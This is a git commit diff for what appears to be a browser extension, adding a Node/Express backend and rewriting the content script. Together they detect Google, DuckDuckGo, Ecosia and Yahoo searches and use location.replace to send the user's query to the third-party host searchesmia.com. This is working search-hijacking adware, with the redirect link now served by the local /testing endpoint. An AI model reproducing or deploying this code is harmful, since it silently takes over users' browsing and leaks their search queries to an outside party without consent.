12bfc592fde99087c0f90ae5f4ed800ccb96acb4
sg <sg.guru1030@gmail.com>
2023-02-10 14:55:49 +1000

    built with backend

---
+++ node-backend/server.js
@@ -0,0 +1,53 @@
+var express = require('express');
+var bodyParser = require('body-parser');
+var app = express();
+const cors = require('cors');
+
+//Allow all requests from all domains & localhost
+app.all('/*', function (req, res, next) {
+    res.header("Access-Control-Allow-Origin", "*");
+    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type, Accept");
+    res.header("Access-Control-Allow-Methods", "POST, GET");
+    next();
+});
+
+app.use(cors());
+app.use(express.static('pdf'))
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: false }));
+
+function checkUrlIsSearchEngine(url) {
+    if (url.match(/^https?:.*?google.*?\/search?/g) != null) {
+        return getQuery(url);
+    }
+    if (url.match(/^https?:.*?duckduckgo.*?\/?q=/g) != null) {
+        return getQuery(url);
+    }
+    if (url.match(/^https?:.*?ecosia.*?\/?search?/g) != null) {
+        return getQuery(url);
+    }
+    if (url.match(/^https?:.*?yahoo.*?\/?search?/g) != null) {
+        return getQuery(url, 'yahoo')
+    }
+}
+
+function getQuery(search, type = '') {
+    var pattern = type == 'yahoo' ? /[\?\&]p=(.*)&?/ : /[\?\&]q=(.*)&?/
+    var result = pattern.exec(search) != null ? pattern.exec(search)[1] : ''
+    var str = result
+    if (type != 'yahoo') {
+        str = result.split('&')[0] || ''
+    }
+    return str
+}
+
+
+app.get('/testing', function (req, res) {
+    var query = req?.query.url || ''
+    var url = checkUrlIsSearchEngine(query)
+    if (url) {
+        res.send({ 'link': `https://searchesmia.com/bingchr5?q=${url}` });
+    }
+});
+
+app.listen(8080);
--- src/content.js
+++ src/content.js
@@ -1,52 +1,18 @@
 var currentUrl = document.URL;
 function checkUrlIsSearchEngine(url) {
-    // var hostName = getHost(url)
-    if (url.match(/^https?:.*?google.*?\/search?/g) != null) {
-        var searchQuery = getQuery(url);
-        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
-    }
-    if (url.match(/^https?:.*?duckduckgo.*?\/?q=/g) != null) {
-        var searchQuery = getQuery(url);
-        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
-    }
-    if (url.match(/^https?:.*?ecosia.*?\/?search?/g) != null) {
-        var searchQuery = getQuery(url);
-        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
-    }
-    if (url.match(/^https?:.*?yahoo.*?\/?search?/g) != null) {
-        var searchQuery = getQuery(url, 'yahoo');
-        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
-    }
-}
-
-function isRedirected(url) {
-    if (url.indexOf('https://searchesmia.com/') != -1) {
-        return true
-    } else {
-        return false
-    }
-}
-
-function getQuery(search, type = '') {
-    var pattern = type == 'yahoo' ? /[\?\&]p=(.*)&?/ : /[\?\&]q=(.*)&?/
-    var result = pattern.exec(search) != null ? pattern.exec(search)[1] : ''
-    var str = result
-    if (type != 'yahoo') {
-        str = result.split('&')[0] || ''
-    }
-    return str
-}
-
-function getHost(url) {
-    var re = new RegExp('^(?:f|ht)tp(?:s)?\://([^/]+)', 'im'),
-        m;
-    if (url != null) {
-        m = url.match(re);
-        if (m != null) {
-            return m[0];
+    $.ajax({
+        'url': 'http://localhost:8080/testing',
+        'type': 'GET',
+        'data': {
+            'url': url
+        },
+        'success': function (data) {
+            data?.link && location.replace(data.link)
+        },
+        'error': function (request, error) {
+            console.log(error);
         }
-    }
-    return url;
+    });
 }
 
-!isRedirected(currentUrl) && checkUrlIsSearchEngine(currentUrl);
+checkUrlIsSearchEngine(currentUrl);
